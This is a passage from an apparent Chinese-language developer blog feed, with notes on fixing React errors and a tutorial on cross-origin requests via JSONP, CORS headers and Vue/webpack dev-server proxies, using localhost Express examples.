<pre><code class="language-js">index.module.css (./node_modules/css-loader/dist/cjs.js??ref--5-oneOf-5-1!./node_modules/postcss-loader/src??postcss!. ... not found babel-loader
</code></pre>
<p>&#x786E;&#x4FDD;&#x4E0A;&#x8FF0;&#x4F9D;&#x8D56;&#x5B8C;&#x6210;&#x540E;&#x5373;&#x53EF;&#x4F7F;&#x7528; CSS Modules &#x3002;&#x7531;&#x4E8E; React &#x5DF2;&#x5185;&#x7F6E; CSS Modules &#xFF0C;&#x53EA;&#x9700;&#x628A;&#x8981;&#x4FDD;&#x8BC1;&#x72EC;&#x7ACB;&#x6837;&#x5F0F;&#x7684;&#x6837;&#x5F0F;&#x63D0;&#x51FA;&#x518D;&#x6CE8;&#x5165;&#x4FDD;&#x8BC1;&#x89C4;&#x8303;&#x540D;&#x7684;&#x6837;&#x5F0F;&#x6587;&#x4EF6;( [name].module.css)&#x5373;&#x53EF;&#xFF0C;&#x6700;&#x540E; <code>.ts</code> &#x6587;&#x4EF6;&#x4E2D;&#x901A;&#x8FC7;&#x81EA;&#x5B9A;&#x4E49;&#x5BF9;&#x8C61;&#x540D;&#x5F15;&#x5165;&#x5219;&#x53EF;&#x4EE5;&#x62FF;&#x5230;&#x7ECF; CSS Modules &#x6F14;&#x5316;&#x540E;&#x751F;&#x6210;&#x7684; css &#x5BF9;&#x8C61;&#x3002;</p>
<ul>
<li>&#x767E;&#x5EA6;&#x5730;&#x56FE; BMapGL &#x672A;&#x5B9A;&#x4E49;</li>
</ul>
<p>React &#x9879;&#x76EE;&#x4E2D;&#xFF0C;&#x4F7F;&#x7528;&#x767E;&#x5EA6;&#x5730;&#x56FE; API &#x5728;&#x4F4D;&#x4E8E; BMapGL &#x547D;&#x540D;&#x7A7A;&#x95F4;&#x4E0B;&#x7684; Map &#x7C7B;&#x901A;&#x8FC7; new &#x64CD;&#x4F5C;&#x7B26;&#x521B;&#x5EFA;&#x5730;&#x56FE;&#x5B9E;&#x4F8B;&#x65F6;&#xFF0C;&#x51FA;&#x73B0;&#x4E86; <code>&apos;BMapGL&apos; is not defined no-undef</code> &#x7684;&#x62A5;&#x9519;&#x3002;</p>
<p>&#x8FD9;&#x91CC;&#x662F;&#x56E0;&#x4E3A; React &#x7684;&#x751F;&#x547D;&#x5468;&#x671F;&#x4E2D; render() &#x9636;&#x6BB5;&#x8D1F;&#x8D23;&#x521B;&#x5EFA;&#x865A; DOM&#xFF0C;&#x8FDB;&#x884C; diff &#x7B97;&#x6CD5;&#xFF0C;&#x66F4;&#x65B0; DOM&#x6811;&#x3002;&#x800C; render &#x53CA;&#x4E4B;&#x524D;&#x7684;&#x9636;&#x6BB5;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x5C06;&#x7EC4;&#x4EF6;&#x6E32;&#x67D3;&#x4E3A;&#x5B9E;&#x9645;&#x7684; DOM &#x8282;&#x70B9;&#xFF0C;&#x6240;&#x4EE5;&#x4E0D;&#x80FD;&#x83B7;&#x53D6; window &#x5BF9;&#x8C61;&#x3002;</p>
<p>&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5728;&#x7EC4;&#x4EF6;&#x5916;&#xFF0C;&#x8FDB;&#x884C;&#x58F0;&#x660E;&#x62FF;&#x5230; window &#x5BF9;&#x8C61;&#x4E0B;&#x7684; BMapGL (&#x63A8;&#x8350;)&#xFF0C;&#x89E3;&#x51B3;&#x811A;&#x624B;&#x67B6;&#x4E2D;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x8BBF;&#x95EE;&#x7684;&#x95EE;&#x9898;&#x3002;&#x518D;&#x5728; componentDidMount &#x751F;&#x547D;&#x5468;&#x671F;&#x4E2D;&#x901A;&#x8FC7; new &#x65B9;&#x6CD5;&#x83B7;&#x53D6;&#x5B9E;&#x4F8B;&#x3002;</p>
<pre><code class="language-js">// &#x65B9;&#x6CD5;&#x4E00;
const BMapGL = window.BMapGL
// &#x65B9;&#x6CD5;&#x4E8C;
var map = new window.BMapGL.Map(&quot;container&quot;);
//&#x521B;&#x5EFA;&#x5730;&#x5740;&#x89E3;&#x6790;&#x5668;&#x5B9E;&#x4F8B;
var myGeo = new window.BMapGL.Geocoder();
...
</code></pre>
<ul>
<li>TypeError: Class extends value undefined is not a constructor or null</li>
</ul>
<pre><code class="language-javascript">src/components/demo.js:2
  1 | import React from &apos;react&apos;
&gt; 2 | export default class Demo extends React.component{ // &#x522B;&#x5199;&#x6210;&#x5C0F;&#x5199;
  3 |   showData = () =&gt; {
  4 |     const {inputt} = this
  5 |     alert(inputt.value)
</code></pre>
<ul>
<li>Functions are not valid as a React child. This may happen if you return a Component instead of <component> from render.</component></li>
</ul>
<p>react-router-v6 =&gt; &#x6807;&#x7B7E; Route &#x7684;&#x5C5E;&#x6027; component &#x66FF;&#x6362;&#x4E3A; element&#xFF0C;element &#x7684;&#x5C5E;&#x6027;&#x503C;&#x8981;&#x5199;&#x6210; JSX &#x7EC4;&#x4EF6;&#x7684;&#x5F62;&#x5F0F;&#x3002;<a href="https://stackoverflow.com/questions/48458334/functions-are-not-valid-as-a-react-child-this-may-happen-if-you-return-a-compon">SOF</a></p>
<pre><code class="language-jsx">&lt;Route path=&quot;/movies/list&quot; exact element={ MoviesList } /&gt;
</code></pre>
<!--kg-card-end: markdown--><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://pomb.us/build-your-own-react/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">Build your own React</div><div class="kg-bookmark-description">We are going to rewrite React from scratch. Step by step. Following the architecture from the real React code but without all the&#x2026;</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://pomb.us/favicon.ico" alt="React"></div></div><div class="kg-bookmark-thumbnail"><img src="https://pomb.us/static/b4694e6041953e3cb16f6a889f0cbc59/54290/card.png" alt="React"></div></a></figure><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE; &#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[非同源策略请求]]></title><description><![CDATA[跨域 => JSONP—CORS—Proxy]]></description><link>yourdomain.com/crossorigin/</link><guid isPermaLink="false">610c4d8d9d12cb5936240827</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Sun, 14 Feb 2021 13:47:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2021/08/familyguy-3.jpg" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5">&#x540C;&#x6E90;&#x7B56;&#x7565;</h2>
<blockquote>
<img src="yourdomain.com/content/images/2021/08/familyguy-3.jpg" alt="&#x975E;&#x540C;&#x6E90;&#x7B56;&#x7565;&#x8BF7;&#x6C42;"><p>&#x6D4F;&#x89C8;&#x5668;&#x5B89;&#x5168;&#x7684;&#x57FA;&#x77F3;&#x662F; &quot;&#x540C;&#x6E90;&#x653F;&#x7B56;&quot;&#xFF08;same-origin policy&#xFF09;&#x3002; Netscape &#x516C;&#x53F8;&#x5F15;&#x5165;&#x6D4F;&#x89C8;&#x5668;&#x3002;&#x76EE;&#x524D;&#xFF0C;&#x6240;&#x6709;&#x6D4F;&#x89C8;&#x5668;&#x90FD;&#x5B9E;&#x884C;&#x8FD9;&#x4E2A;&#x653F;&#x7B56;&#x3002;</p>
<p>&#x6240;&#x8C13;&#x540C;&#x6E90;&#x662F;&#x6307; &quot;&#x534F;&#x8BAE;+&#x57DF;&#x540D;+&#x7AEF;&#x53E3;&quot; &#x4E09;&#x8005;&#x76F8;&#x540C;&#xFF0C;&#x5373;&#x4FBF;&#x4E24;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x57DF;&#x540D;&#x6307;&#x5411;&#x540C;&#x4E00;&#x4E2A; IP &#x5730;&#x5740;&#xFF0C;&#x4E5F;&#x975E;&#x540C;&#x6E90;&#x3002;<br>
&#x5B83;&#x662F;&#x6D4F;&#x89C8;&#x5668;&#x6700;&#x6838;&#x5FC3;&#x4E5F;&#x6700;&#x57FA;&#x672C;&#x7684;&#x5B89;&#x5168;&#x529F;&#x80FD;&#xFF0C;&#x5982;&#x679C;&#x7F3A;&#x5C11;&#x4E86;&#x540C;&#x6E90;&#x7B56;&#x7565;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x5F88;&#x5BB9;&#x6613;&#x53D7;&#x5230; XSS&#x3001;CSFR &#x7B49;&#x653B;&#x51FB;&#x3002;</p>
<p>&#x540C;&#x6E90;&#x7B56;&#x7565;&#x9650;&#x5236;&#x4EE5;&#x4E0B;&#x51E0;&#x79CD;&#x884C;&#x4E3A;&#xFF1A;&#xFF08;1&#xFF09; Cookie&#x3001;LocalStorage &#x548C; IndexDB &#x65E0;&#x6CD5;&#x8BFB;&#x53D6;&#x3002;&#xFF08;2&#xFF09; DOM &#x65E0;&#x6CD5;&#x83B7;&#x5F97;&#x3002;&#xFF08;3&#xFF09; AJAX &#x8BF7;&#x6C42;&#x4E0D;&#x80FD;&#x53D1;&#x9001;&#x3002;</p>
</blockquote>
<p>&#x5728;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#xFF08;&#x9879;&#x76EE;&#x4E0A;&#x7EBF;&#x90E8;&#x7F72;&#x5B8C;&#x6210;&#xFF09;&#x4E0D;&#x5B58;&#x5728;&#x8DE8;&#x57DF;&#x95EE;&#x9898;&#xFF0C;&#x8DE8;&#x57DF;&#x662F;&#x9488;&#x5BF9;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x534F;&#x8BAE;&#x3001;&#x57DF;&#x540D;&#x3001;&#x7AEF;&#x53E3;&#x800C;&#x8A00;&#x7684;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="jsonp-json-with-padding">JSONP JSON with padding</h2>
<p>&#x6D4F;&#x89C8;&#x5668;&#x540C;&#x6E90;&#x7B56;&#x7565;&#x5BFC;&#x81F4;&#x7F51;&#x9875;&#x4E2D;&#x65E0;&#x6CD5;&#x901A;&#x8FC7; Ajax &#x8BF7;&#x6C42;&#x8FDB;&#x884C;&#x8DE8;&#x57DF;&#x8BBF;&#x95EE;&#xFF0C;JSONP &#x7684;&#x539F;&#x7406;&#x662F;&#x90E8;&#x5206;&#x6807;&#x7B7E;&#x7684; src &#x5C5E;&#x6027;&#x4E0D;&#x5B58;&#x5728;&#x8DE8;&#x57DF;&#x8BF7;&#x6C42;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x5230;&#x8DE8;&#x57DF;&#x7684;&#x811A;&#x672C;&#x3002;</p>
<p>&#x670D;&#x52A1;&#x7AEF;&#x4E0D;&#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;&#x683C;&#x5F0F;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x800C;&#x662F;&#x8FD4;&#x56DE;&#x6CE8;&#x5165;&#x6570;&#x636E;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x7684;&#x811A;&#x672C;&#x3002;&#x5BA2;&#x6237;&#x7AEF;&#x5B9A;&#x4E49;&#x670D;&#x52A1;&#x7AEF;&#x8FD4;&#x56DE;&#x8C03;&#x7528;&#x7684;&#x540C;&#x540D;&#x51FD;&#x6570;&#x3002;</p>
<p>src &#x5C5E;&#x6027;&#x4E0D;&#x4EC5;&#x7528;&#x4F5C;&#x5C06;&#x51FD;&#x6570;&#x540D;&#x5E26;&#x5165;&#x8BF7;&#x6C42;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x800C;&#x4E14;&#x4F1A;&#x6267;&#x884C;&#x670D;&#x52A1;&#x7AEF;&#x8FD4;&#x56DE;&#x7684;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x3002;</p>
<pre><code class="language-javascript">const script = document.createElement(&quot;script&quot;), handle = function (data) { console.log(data.code, data.msg); }
script.src = &quot;http://localhost:3000/jsonp-server?callback=handle&quot;;
document.body.appendChild(script)
</code></pre>
<pre><code class="language-javascript">const express = require(&apos;express&apos;);
const app = express(), port = 3000;
app.get(&apos;/jsonp-server&apos;, (req,res)=&gt;{
  const { callback } = req.query, data = { code: 200, msg: &apos;jsonp request success!&apos; }
  res.send(`${callback}(${JSON.stringify(data)})`) // &#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; end =&gt; &#x4E0D;&#x52A0;&#x7279;&#x6B8A;&#x54CD;&#x5E94;&#x5934;
});
app.listen(port, () =&gt; { console.log(`app listen is running at http://localhost:${port}`); });
</code></pre>
<p>&#x7C7B;&#x4F3C;&#x7684;&#x5728; React &#x4E2D;&#xFF0C;&#x7EC4;&#x4EF6;&#x901A;&#x8BAF;&#x7684;&#x5C5E;&#x6027;&#x4F20;&#x9012;&#x4E00;&#x822C;&#x53EA;&#x80FD;&#x7236;&#x4F20;&#x5B50;&#xFF0C;&#x8981;&#x662F;&#x60F3;&#x5B9E;&#x73B0;&#x5B50;&#x4F20;&#x7236;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x7236;&#x7EC4;&#x4EF6;&#x63D0;&#x4F9B;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x6765;&#x63A5;&#x6536;&#x6570;&#x636E;&#xFF0C;&#x5C06;&#x8BE5;&#x51FD;&#x6570;&#x4F5C;&#x4E3A;&#x5C5E;&#x6027;&#x7684;&#x503C;&#x4F20;&#x9012;&#x7ED9;&#x5B50;&#x7EC4;&#x4EF6;&#xFF0C;&#x5B50;&#x7EC4;&#x4EF6;&#x4EE5; props &#x8C03;&#x7528;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x3002;</p>
<p>&#x7531;&#x4E8E;&#x6240;&#x6709;&#x7684; src &#x90FD;&#x662F;&#x8D44;&#x6E90;&#x6587;&#x4EF6;&#x8BF7;&#x6C42;&#xFF0C;&#x5BFC;&#x81F4; JSONP &#x53EA;&#x80FD;&#x4F7F;&#x7528; GET &#x65B9;&#x6CD5;&#xFF1B;&#x5728;&#x8DEF;&#x5F84;&#x4F20;&#x53C2;&#x5C06;&#x51FD;&#x6570;&#x4F20;&#x9012;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x65F6;&#xFF0C;&#x4F1A;&#x5B58;&#x5728; url &#x52AB;&#x6301;&#x7684;&#x95EE;&#x9898;&#x3002;</p>
<p>jQuery &#x53D1;&#x8D77; JSONP &#x8BF7;&#x6C42;&#x65F6;&#x5FC5;&#x987B;&#x6307;&#x5B9A; <code>dataType: &apos;jsonp&apos;</code>&#xFF0C;callback=jQueryxxx &#x53C2;&#x6570;&#x4F1A;&#x88AB;&#x81EA;&#x52A8;&#x643A;&#x5E26;&#xFF0C;jQueryxxx &#x662F;&#x968F;&#x673A;&#x751F;&#x6210;&#x7684;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x540D;&#x3002;&#x5176;&#x5B9E;&#x73B0;&#x8FC7;&#x7A0B;&#x662F;&#x52A8;&#x6001;&#x7684;&#x5728; &lt;header&gt; &#x4E2D;&#x521B;&#x5EFA;&#x548C;&#x79FB;&#x9664; &lt;script&gt;&#xFF0C;&#x5E76;&#x53D1;&#x8D77; JSONP &#x6570;&#x636E;&#x8BF7;&#x6C42;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="cors-%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB"><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS">CORS</a> &#x8DE8;&#x57DF;&#x8D44;&#x6E90;&#x5171;&#x4EAB;</h2>
<p>&#x8DE8;&#x57DF;&#x8D44;&#x6E90;&#x5171;&#x4EAB;&#x662F;&#x4E00;&#x7CFB;&#x5217;&#x51B3;&#x5B9A;&#x6D4F;&#x89C8;&#x5668;&#x662F;&#x5426;&#x963B;&#x6B62;&#x524D;&#x7AEF;&#x8DE8;&#x57DF;&#x83B7;&#x53D6;&#x8D44;&#x6E90;&#x7684;&#x54CD;&#x5E94;&#x5934;&#x7EC4;&#x3002;&#x901A;&#x8FC7;&#x914D;&#x7F6E;&#x63A5;&#x53E3;&#x670D;&#x52A1;&#x5668;&#x76F8;&#x5173; HTTP &#x54CD;&#x5E94;&#x5934;&#x53EF;&#x89E3;&#x9664;&#x6D4F;&#x89C8;&#x5668;&#x7AEF;&#x8DE8;&#x57DF;&#x8BBF;&#x95EE;&#x9650;&#x5236;&#x3002;</p>
<p>&#x6839;&#x636E;&#x8BF7;&#x6C42;&#x65B9;&#x5F0F;&#x4E0E;&#x8BF7;&#x6C42;&#x5934;&#x4E0D;&#x540C;&#xFF0C;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#%E7%AE%80%E5%8D%95%E8%AF%B7%E6%B1%82">&#x7B80;&#x5355;&#x8BF7;&#x6C42;</a>&#x548C;<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Preflight_request">&#x9884;&#x68C0;&#x8BF7;&#x6C42;</a>&#x3002;</p>
<ul>
<li>&#x8BF7;&#x6C42;&#x65B9;&#x5F0F;&#x662F; GET&#x3001;POST&#x3001;HEAD &#x4E14; HTTP &#x5934;&#x90E8;&#x4FE1;&#x606F;&#x4E0D;&#x8D85;&#x8FC7;&#x4E0A;&#x8FF0;&#x4EE3;&#x7801;&#x51E0;&#x79CD;&#x5B57;&#x6BB5;&#xFF08;&#x65E0;&#x81EA;&#x5B9A;&#x4E49;&#x5934;&#x90E8;&#x5B57;&#x6BB5;&#xFF09;&#x5219;&#x4E3A;&#x7B80;&#x5355;&#x8BF7;&#x6C42;&#x3002;</li>
<li>&#x8BF7;&#x6C42;&#x65B9;&#x5F0F;&#x4E3A; GET&#x3001;POST&#x3001;HEAD &#x4EE5;&#x5916;&#x7684; METHOD &#x7C7B;&#x578B;&#x3001;&#x8BF7;&#x6C42;&#x5934;&#x5305;&#x542B;&#x81EA;&#x5B9A;&#x4E49;&#x5934;&#x90E8;&#x5B57;&#x6BB5;&#x3001;&#x5411;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x4E86; application\json &#x683C;&#x5F0F;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x6EE1;&#x8DB3;&#x5176;&#x4E2D;&#x4EFB;&#x4F55;&#x4E00;&#x79CD;&#x6761;&#x4EF6;&#x90FD;&#x662F;&#x9884;&#x68C0;&#x8BF7;&#x6C42;&#x3002;</li>
</ul>
<pre><code class="language-javascript">const express = require(&quot;express&quot;);
// const cors = require(&apos;cors&apos;) + app.use(cors()) =&gt; &#x7C97;&#x66B4;&#x578B;
const app = express();
const port = 3001;
// &#x4F7F;&#x7528; express + node &#x65F6;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x914D;&#x7F6E;&#x4E2D;&#x95F4;&#x4EF6;&#x914D;&#x7F6E;&#x5934;&#x5373;&#x53EF;
app.use((req, res, next) =&gt; {
  // Access-Control-Allow-Origin - &#x5141;&#x8BB8;&#x8BBF;&#x95EE;&#x8BE5;&#x8D44;&#x6E90;&#x7684;&#x5916;&#x57DF;URL
  res.header(&quot;Access-Control-Allow-Origin&quot;, &quot;http://127.0.0.1:5500&quot;); // &#x4F7F;&#x7528; * &#x907F;&#x514D;&#x53EA;&#x6709;&#x5355;&#x4E2A;&#x6E90;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;, &#x4F46;&#x662F;&#x4E0D;&#x53EF;&#x4EE5;&#x643A;&#x5E26; cookie =&gt; &#x4FDD;&#x8BC1;&#x5B89;&#x5168;
  res.header( &quot;Access-Control-Allow-Methods&quot;, &quot;GET, POST, DELETE, OPTIONS, HEAD&quot; );
  res.header( // &#x652F;&#x6301;&#x5BA2;&#x6237;&#x7AEF;&#x5411;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x5982;&#x4E0B;&#x7684; 9 &#x4E2A;&#x8BF7;&#x6C42;&#x5934;
    &quot;Access-Control-Allow-Headers&quot;,
    &quot;Accept,Accept-Language, Content-Language,DPR,Downlink,Save-Data,Viewport-Width,Width,Content-Type&quot;
  );
  res.header(&quot;Access-Control-Allow-Credentials&quot;, true); // &#x662F;&#x5426;&#x5141;&#x8BB8;&#x643A;&#x5E26;&#x8D44;&#x6E90;&#x51ED;&#x8BC1;-cookie
  // &#x6240;&#x6709; cors &#x9884;&#x5148;&#x53D1;&#x9001; OPTIONS &#x8BD5;&#x63A2;&#x6027;&#x8BF7;&#x6C42; =&gt; &#x7528;&#x5B8C;&#x6CE8;&#x91CA;&#x5373;&#x53EF;
//   req.method === &apos;OPTIONS&apos; ? res.send(&apos;SURPPORT CROSS DOMAIN REQUEST&apos;) : res.send(&quot;SORRY, you can&apos;t cross, somewhere happens error&quot;)
  next();
});
app.get(&quot;/getcors&quot;, function (req, res) { res.send(&quot;finished the request!&quot;); });
app.listen(port, () =&gt; { console.log(`app listen is running at http://localhost:${port}`); });
</code></pre>
<pre><code class="language-html">&lt;script src=&quot;./node_modules/jquery/dist/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
  $.ajax({
    method: &quot;OPTIONS&quot;,
    url: &quot;http://localhost:3001&quot;,
    success: (res) =&gt; {
      console.log(res); // SURPPORT CROSS DOMAIN REQUEST
    },
  });
  $.ajax({
    method: &quot;get&quot;,
    url: &quot;http://localhost:3001/getcors&quot;,
    success: (res) =&gt; {
      console.log(res); // finished the request!
    },
  });
&lt;/script&gt;
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8">&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;</h2>
<p>Vue &#x9879;&#x76EE;&#x53EF;&#x4EE5;&#x5728;&#x9700;&#x8981;&#x8DE8;&#x57DF;&#x65F6;&#x76F4;&#x63A5;&#x8BF7;&#x6C42;&#x672C;&#x5730;&#x670D;&#x52A1;&#x5668; 8080 &#x7AEF;&#x53E3;&#xFF0C;&#x901A;&#x8FC7;&#x914D;&#x7F6E;&#x4EE3;&#x7406;&#x8F6C;&#x53D1;&#x7ED9;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x8D44;&#x6E90;&#x670D;&#x52A1;&#x5668;&#x3001;&#x6570;&#x636E;&#x670D;&#x52A1;&#x5668;...&#xFF09;&#x83B7;&#x53D6;&#x8D44;&#x6E90;&#x3002;&#x6CE8;&#x610F;&#x5F53;&#x8BF7;&#x6C42;&#x7684;&#x5185;&#x5BB9;&#x5B58;&#x5728;&#x540C;&#x540D;&#x4E8E; public &#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x90A3;&#x4E48;&#x4E0D;&#x4F1A;&#x8F6C;&#x53D1;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x800C;&#x662F;&#x76F4;&#x63A5;&#x4ECE; public &#x76EE;&#x5F55;&#x8BFB;&#x53D6;&#x3002;</p>
<pre><code class="language-javascript">// App.vue
created () {
  axios.get(&apos;/devserver&apos;).then(res =&gt; console.log(res.data))
  this.testtt()
},
methods: {
  testtt () {
    var xhr = new XMLHttpRequest()
    xhr.open(&apos;GET&apos;, &apos;http://localhost:8080/getcors&apos;, true)
    xhr.send()
    xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {
      console.log(xhr.responseText);
    }}
  }
}
</code></pre>
<pre><code class="language-javascript">// vue.config.js
// vue.config.js &#x6253;&#x5305;&#x540E;&#x5C31;&#x4E0D;&#x8D77;&#x4F5C;&#x7528;. &#x53EF;&#x9009;&#x9879; vue.config.js &#x6587;&#x4EF6;&#x5C31;&#x7B49;&#x540C;&#x4E8E; webpack &#x7684; webpack.config.js . vue-cli3 &#x4E4B;&#x540E;&#x5E76;&#x4E0D;&#x4F1A;&#x81EA;&#x52A8;&#x521B;&#x5EFA; vue.config.js , &#x56E0;&#x4E3A;&#x90FD;&#x662F;&#x9700;&#x8981;&#x4FEE;&#x6539; webpack &#x7684;&#x65F6;&#x5019;&#x624D;&#x4F1A;&#x521B;&#x5EFA; vue.config.js &#x8FDB;&#x884C;&#x914D;&#x7F6E;.
module.exports = {
  devServer: {
    host: &quot;localhost&quot;,
    // &#x9879;&#x76EE;&#x5F00;&#x542F;&#x7AEF;&#x53E3;
    port: 8080,
    proxy: {
      // /getcors &#x8868;&#x793A;&#x62E6;&#x622A;&#x4EE5; getcors &#x5F00;&#x5934;&#x7684;&#x5730;&#x5740;
      &quot;/getcors&quot;: {
        target: &quot;http://localhost:3001&quot;,
        changeOrigin: true, // &#x662F;&#x5426;&#x5982;&#x5B9E;&#x7980;&#x62A5;&#x670D;&#x52A1;&#x5668; - &#x540E;&#x7AEF;&#x901A;&#x8FC7;request.get(&apos;Host&apos;)&#x67E5;&#x770B;
      },
      &quot;/devserver&quot;: {
        target: &quot;http://localhost:3001&quot;,
        changeOrigin: true,
      },
      &quot;/needrewrite&quot;: {
        target: &quot;http://localhost:3002&quot;,
        changeOrigin: true,
        // &#x5339;&#x914D;&#x4EE5; needrewrite &#x5F00;&#x5934;&#x7684;&#x8DEF;&#x5F84;&#x8F6C;&#x4E3A;&#x7A7A;&#x5B57;&#x7B26;&#x4E32;.
        // &#x907F;&#x514D;&#x643A;&#x5E26;&#x63A7;&#x5236;&#x670D;&#x52A1;&#x5668;&#x4F5C;&#x7528;&#x7684; needrewrite,&#x88AB;&#x643A;&#x5E26;&#x5230;&#x8BF7;&#x6C42;&#x8DEF;&#x5F84;&#x4E2D;
        pathRewrite: { &quot;^/needrewrite&quot;: &quot;&quot; },
        ws: true, // &#x7528;&#x4E8E;&#x652F;&#x6301; websockect
      },
    },
  },
};
</code></pre>
<pre><code class="language-javascript">// node.js &#x540E;&#x7AEF;&#x670D;&#x52A1;
const express = require(&apos;express&apos;);
const app = express();
const port = 3001;
app.get(&apos;/getcors&apos;,function (req, res) {
  res.send(&apos;finished the request!&apos;)
});
app.get(&apos;/devserver&apos;,function (req, res) {
  res.send(&apos;finished the request by devserver!&apos;)
});
app.listen(port, () =&gt; {
  console.log(`app listen is running at http://localhost:${port}`);
})
</code></pre>
<pre><code class="language-javascript">// &#x6838;&#x5FC3;&#x539F;&#x7406; =&gt; webpack &#x7684; devServer.proxy &#x4F7F;&#x7528;&#x7684; http-proxy-middleware &#x5305;
const express = require(&apos;express&apos;);
const { createProxyMiddleware } = require(&apos;http-proxy-middleware&apos;)
const app = express();
const port = 8080;
app.use(
  &quot;/&quot;,
  createProxyMiddleware({
    target: &quot;http://localhost:3001&quot;,
    changeOrigin: true
  })
)

app.listen(port, () =&gt; { console.log(`app listen is running at http://localhost:${port}`); })
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE; &#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[🥷🏻Ghost&Github Config]]></title><description><![CDATA[Vim ninjas count every keystroke!]]></description><link>yourdomain.com/webconfig/</link><guid isPermaLink="false">60e1e88bdcff0833706c161d</guid><category><![CDATA[welcome]]></category><category><![CDATA[Technology growth]]></category><category><![CDATA[BUG handled]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Thu, 14 Jan 2021 13:41:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2022/07/Shuriken.jpg" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: html--><iframe src="https://open.spotify.com/embed/playlist/78ItgKYjnaiz0T9w56Hgce?theme=0" width="100%" height="180" frameborder="0" allowtransparency="true" allow="encrypted-media"></iframe><!--kg-card-end: html--><!--kg-card-begin: markdown--><img src="yourdomain.com/content/images/2022/07/Shuriken.jpg" alt="&#x1F977;&#x1F3FB;Ghost&amp;Github Config"><p>GitPage &#x4E0A;&#x7684; Jekyll &#x4E0E; Ghost 